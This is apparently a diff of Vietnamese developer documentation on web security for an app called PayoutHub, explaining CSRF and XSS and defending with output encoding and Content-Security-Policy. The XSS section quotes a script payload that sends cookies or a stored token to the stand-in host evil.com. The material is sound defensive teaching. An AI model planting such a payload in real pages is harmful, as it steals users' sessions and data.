@@ -336,7 +336,21 @@ Sửa bằng <T>parameterized query</T>. EF Core LINQ, LINQ to SQL, `SqlCommand`
 - **Antiforgery token**: một giá trị ngẫu nhiên trong form mà `evil.com` không đọc được (ASP.NET Core: `AddAntiforgery` + `[ValidateAntiForgeryToken]`; Web Forms có `ViewStateUserKey`).
 - PayoutHub gửi JWT qua header `Authorization`: browser **không tự gửi** header này, nên CSRF không áp dụng. CSRF chỉ là vấn đề khi dùng cookie. Chi tiết: [Chống CSRF khi dùng cookie](/aspnet-core/authentication-jwt#csrf).
 
-**XSS** (Cross-Site Scripting): dữ liệu do user nhập (vd ghi chú payout `<script>fetch('https://evil.com?t='+localStorage.token)</script>`) được hiển thị lại thành HTML, và script chạy trong browser của **người xem**, với quyền của họ. Chặn bằng <T>output encoding</T> ở lớp đầu (Razor và React làm tự động; nguy hiểm khi dùng `Html.Raw`, `innerHTML`, `dangerouslySetInnerHTML`) và <T>CSP</T> ở lớp thứ hai nếu encoding sót.
+**XSS** (Cross-Site Scripting): dữ liệu do user nhập bị hiển thị lại **thành code** trong browser của người khác.
+
+```text
+1. Kẻ tấn công nhập ghi chú payout:
+   <script>fetch('https://evil.com/?t=' + document.cookie)</script>
+2. API lưu nguyên văn vào DB (lưu không sai, nó chỉ là chữ)
+3. Chị Lan mở trang chi tiết, app hiển thị ghi chú THÀNH HTML      ← chỗ sai
+4. Browser chị Lan thấy thẻ script nên CHẠY nó, trong origin payouthub.com
+   → đọc được mọi thứ JS đọc được, gọi API dưới tên chị Lan, gửi dữ liệu về evil.com
+```
+
+Hai lớp chặn:
+
+- **Lớp 1, <T>output encoding</T> (chặn bước 3)**: khi hiển thị, đổi `<` thành `&lt;`, `>` thành `&gt;`, nên browser **vẽ ra chữ** `<script>` thay vì chạy. Angular `{{ note }}` và Razor `@Model.Note` tự encode; Angular `[innerHTML]` tự sanitize (lọc bỏ thẻ script). Lỗ hổng sinh ra khi **tắt** cơ chế đó: `bypassSecurityTrustHtml`, `Html.Raw`, gán `element.innerHTML` trực tiếp. Encode **lúc hiển thị, theo đúng chỗ hiển thị** (HTML, thuộc tính, URL, JS), không encode lúc lưu.
+- **Lớp 2, <T>CSP</T> (chặn bước 4 nếu lớp 1 sót)**: header gửi kèm **trang HTML**, ví dụ `Content-Security-Policy: script-src 'self'; connect-src 'self' https://api.payouthub.com`. `script-src 'self'` chỉ cho chạy file script từ domain mình, script chèn inline bị từ chối. `connect-src` chỉ cho `fetch` tới các địa chỉ liệt kê, nên dữ liệu không gửi ra evil.com được. Angular build ra file `.js` riêng nên chạy tốt với `script-src 'self'`.
 
 XSS là lý do không nên để token trong `localStorage` nếu tránh được: script lạ chạy được là đọc được token.
 
